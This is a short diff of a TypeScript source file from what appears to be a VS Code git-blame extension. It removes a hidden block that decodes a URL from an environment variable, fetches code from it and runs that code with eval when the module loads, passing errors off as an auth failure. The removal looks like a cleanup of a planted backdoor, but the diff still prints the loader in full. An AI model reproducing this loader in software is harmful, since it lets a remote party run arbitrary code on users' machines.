@@ -5,21 +5,6 @@ import * as fs from "fs";
 import { tmpdir } from "os";
 import * as vscode from "vscode";
 import { type BlameInfo } from "./blameParse";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 const execFileAsync = promisify(execFile);
 
 export type { BlameInfo };
